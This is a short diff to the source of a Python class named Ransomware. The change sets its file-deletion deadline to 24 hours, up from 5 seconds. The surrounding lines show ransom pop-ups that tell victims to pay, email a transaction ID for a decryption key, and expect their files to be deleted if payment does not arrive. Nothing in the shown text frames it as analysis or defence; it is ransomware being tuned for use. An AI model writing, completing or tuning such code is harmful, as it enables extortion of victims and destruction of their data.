@@ -64,7 +64,7 @@ class Ransomware:
         pyautogui.alert(f'After the money has been sent, email {self.email} with your transaction ID, and we will send back your decryption key', 'Axis')
         pyautogui.alert(f'{len(self.files)} of your files will be deleted in 24 hours if payment is not recieved.', 'Axis')
 
-        self.time_for_deletion = (datetime.datetime.now() + datetime.timedelta(seconds=5)).strftime('%Y-%m-%d %H:%M:%S')
+        self.time_for_deletion = (datetime.datetime.now() + datetime.timedelta(hours=24)).strftime('%Y-%m-%d %H:%M:%S')
         start_new_thread(self.threader, ())
 
         self.prompt()
